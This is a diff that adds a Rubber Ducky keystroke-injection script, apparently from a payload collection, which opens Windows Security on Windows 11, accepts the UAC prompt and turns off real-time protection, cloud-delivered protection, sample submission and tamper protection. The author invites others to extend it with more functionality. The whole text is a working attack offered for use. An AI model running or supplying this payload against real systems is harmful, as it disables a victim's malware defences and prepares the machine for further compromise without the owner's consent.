@@ -1,0 +1,45 @@
+REM Author      : https://github.com/JAKAMI99
+REM Description : Disable Windows Security (formal known as Windows Defender) on Windows 11.
+REM             : Extent this script to add functionality, other then disabling antivirus.
+
+DELAY 200
+REM Navigate to Windows Defender
+WINDOWS R 
+DELAY 300
+STRING windowsdefender:
+ENTER
+DELAY 3000
+REM Navigate to settings
+ENTER
+DELAY 500
+TAB 
+TAB
+TAB
+TAB
+ENTER
+DELAY 500
+REM Disable Realtime protection
+SPACE
+DELAY 700
+REM Press "Yes" in UAC
+LEFT
+ENTER
+DELAY 300
+
+REM Disabled "Cloud-delivered protection"
+TAB
+SPACE
+DELAY 100
+
+REM Disable "Automatic sample submission"
+TAB
+SPACE
+DELAY 100
+
+REM Disable "Tamper protection"
+TAB
+TAB
+SPACE
+DELAY 100
+REM Close Windows Defender
+ALT F4
